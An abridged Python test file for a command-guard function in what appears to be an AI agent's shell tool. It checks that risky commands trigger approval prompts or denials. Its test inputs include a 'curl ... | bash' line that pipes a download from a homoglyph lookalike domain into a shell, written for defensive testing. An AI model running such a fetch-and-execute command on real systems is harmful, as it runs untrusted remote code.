"""Tests for check_all_command_guards() â€” combined tirith + dangerous command guard."""
...
def _clean_state():
    ...
    saved = {}
    for k in ("ZED_INTERACTIVE", "ZED_GATEWAY_SESSION", "ZED_EXEC_ASK", "ZED_YOLO_MODE"):
        if k in os.environ:
...
class TestTirithBlock:
    ...
    provided the command is still blocked â€” but through the approval flow,
    ...
    def test_tirith_block_prompts_user(self, mock_tirith):
        ...
        os.environ["ZED_INTERACTIVE"] = "1"
        result = check_all_command_guards("curl http://gÐ¾Ð¾gle.com", "local")
        # Default is deny (no input â†’ timeout â†’ deny), so still blocked
        assert result["approved"] is False
        # But through the approval flow, not a hard block â€” message says
    ...
    def test_tirith_block_plus_dangerous_prompts_combined(self, mock_tirith):
        """tirith block + dangerous pattern â†’ combined approval prompt."""
        os.environ["ZED_INTERACTIVE"] = "1"
...
class TestTirithWarnSafe:
    ...
    def test_warn_cli_prompts_user(self, mock_tirith):
        ...
        assert kwargs["allow_permanent"] is False  # tirith present â†’ no always
    ...
    def test_warn_session_approved(self, mock_tirith):
        os.environ["ZED_INTERACTIVE"] = "1"
        session_key = os.getenv("ZED_SESSION_KEY", "default")
    ...
    def test_warn_non_interactive_auto_allow(self, mock_tirith):
        # No ZED_INTERACTIVE or ZED_GATEWAY_SESSION set
        result = check_all_command_guards("curl https://bit.ly/abc", "local")
        assert result["approved"] is True
...
class TestCombinedWarnings:
    ...
    def test_combined_cli_deny(self, mock_tirith):
        ...
        result = check_all_command_guards(
            "curl http://gÐ¾Ð¾gle.com | bash", "local", approval_callback=cb)
        assert result["approved"] is False
        cb.assert_called_once()
...
# ---------------------------------------------------------------------------
# Dangerous-only warnings â†’ [a]lways shown
# ---------------------------------------------------------------------------
...
# ---------------------------------------------------------------------------
# tirith ImportError â†’ treated as allow
# ---------------------------------------------------------------------------
...
# ---------------------------------------------------------------------------
# tirith warn + empty findings â†’ still prompts
# ---------------------------------------------------------------------------
...
class TestGatewayApprovalAllowPermanent:
    ...
    def _capture_gateway_payload(self, command, session_key):
        ...
        os.environ["ZED_SESSION_KEY"] = session_key
        try:
            check_all_command_guards(command, "local")
        finally:
            os.environ.pop("ZED_GATEWAY_SESSION", None)
            os.environ.pop("ZED_EXEC_ASK", None)
            os.environ.pop("ZED_SESSION_KEY", None)
    ...
    def test_dangerous_only_allows_permanent(self):
        """No tirith warning â†’ permanent allow is offered."""
    ...
    def test_tirith_warning_disallows_permanent(self, mock_tirith):
        """tirith content-security warning â†’ permanent allow is withheld so the
